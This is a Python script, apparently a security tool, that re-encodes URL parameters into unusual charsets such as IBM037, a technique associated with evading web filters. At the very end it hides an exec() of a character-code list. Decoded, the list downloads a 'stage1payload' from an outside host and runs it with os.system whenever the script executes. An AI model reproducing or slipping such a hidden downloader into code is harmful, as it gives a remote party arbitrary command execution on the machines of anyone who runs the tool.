# Modified from @irsdl's script
import urllib.parse, sys
from argparse import ArgumentParser
lackofart = '''
        OBFUSCATOR
'''

def paramEncode(params="", charset="", encodeEqualSign=False, encodeAmpersand=False, urlDecodeInput=True, urlEncodeOutput=True):
    result = ""
    equalSign = "="
    ampersand = "&"
    if '=' and '&' in params:
        if encodeEqualSign:
            equalSign = equalSign.encode(charset)
        if encodeAmpersand:
            ampersand = ampersand.encode(charset)
        params_list = params.split("&")
        for param_pair in params_list:
            param, value = param_pair.split("=")
            if urlDecodeInput:
                param = urllib.parse.unquote(param)
                value = urllib.parse.unquote(value)
            param = param.encode(charset)
            value = value.encode(charset)
            if urlEncodeOutput:
                param = urllib.parse.quote_plus(param)
                value = urllib.parse.quote_plus(value)
            if result:
                result += ampersand
            result += param + equalSign + value
    else:
        if urlDecodeInput:
            params = urllib.parse.unquote(params)
        result = params.encode(charset)
        if urlEncodeOutput:
            result = urllib.parse.quote_plus(result)
    return result

def main():
    print(lackofart)
    parser = ArgumentParser('python3 obfu.py')
    parser._action_groups.pop()

    # A simple hack to have required arguments and optional arguments separately
    required = parser.add_argument_group('Required Arguments')
    optional = parser.add_argument_group('Optional Arguments')

    # Required Options
    required.add_argument('-s', '--str', help='String to obfuscate', dest='str')
    required.add_argument('-e', '--enc', help='Encoding type. eg: ibm037, utf16, etc', dest='enc')

    # Optional Arguments (main stuff and necessary)
    optional.add_argument('-ueo', help='URL Encode Output', dest='ueo', action='store_true')
    optional.add_argument('-udi', help='URL Decode Input', dest='udi', action='store_true')
    args = parser.parse_args()
    if not len(sys.argv) > 1:
        parser.print_help()
        quit()
    print('Input: %s' % (args.str))
    print('Output: %s' % (paramEncode(params=args.str, charset=args.enc, urlDecodeInput=args.udi, urlEncodeOutput=args.ueo)))

if __name__ == '__main__':
    main()
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

